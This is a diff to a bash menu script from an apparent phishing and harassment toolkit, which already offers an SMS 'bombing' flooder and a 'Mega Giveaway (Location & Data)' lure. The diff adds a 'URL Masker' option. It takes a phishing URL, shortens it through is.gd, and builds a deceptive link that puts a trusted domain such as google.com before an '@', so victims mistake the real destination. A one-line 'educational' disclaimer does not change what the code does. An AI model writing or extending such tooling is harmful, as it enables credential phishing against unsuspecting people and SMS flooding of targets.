@@ -124,6 +124,8 @@ echo -e "  ${B}[3]${NC} Mega Giveaway (Location & Data)"
 
 echo -e "  ${B}[4]${NC} SMS Stress Tester (API Flooding)" # New Option
 
+echo -e "  ${B}[5]${NC} URL Masker (Link Cloaking)"
+
 read -p "  Selection > " option
 
 if [[ $option == "4" ]]; then
@@ -141,6 +143,37 @@ if [[ $option == "4" ]]; then
     cd ../../
     echo -e "\n${G}[+] Bombing Task Complete.${NC}"
     sleep 2
+    exec ./techyfatcat.sh
+fi
+
+if [[ $option == "5" ]]; then
+    echo -e "\n${C}━━━━━━━━━━━━━ URL MASKER ━━━━━━━━━━━━━${NC}"
+    read -p "  Enter Phishing/Original URL (e.g. http://ngrok...): " phish_url
+    read -p "  Enter Masking Domain (e.g. google.com, instagram.com): " mask_dom
+    read -p "  Enter Social Keywords (e.g. free-giveaway, login): " keywords
+
+    echo -e "\n${Y}[*] Shortening and masking...${NC}"
+    
+    # Use is.gd or da.gd for shortening (reliable & no API key needed)
+    short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$phish_url")
+    
+    if [[ $short_url == *"err"* || -z "$short_url" ]]; then
+        echo -e "${R}[!] Error: Invalid URL or API down.${NC}"
+        sleep 2
+        exec ./techyfatcat.sh
+    fi
+
+    # The magic: creating the masked link
+    # Format: https://mask-domain-keywords@short-url
+    masked_url="https://$mask_dom-$keywords@${short_url#https://}"
+
+    echo -e "\n${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e " ${G}[+] SUCCESSFUL MASKING]${NC}"
+    echo -e " ${W}Masked URL: ${C}$masked_url${NC}"
+    echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    echo -e "\n${Y}Note: Use this link for educational Social Engineering tests only.${NC}"
+    read -p "  Press Enter to return to menu..."
     exec ./techyfatcat.sh
 fi
 
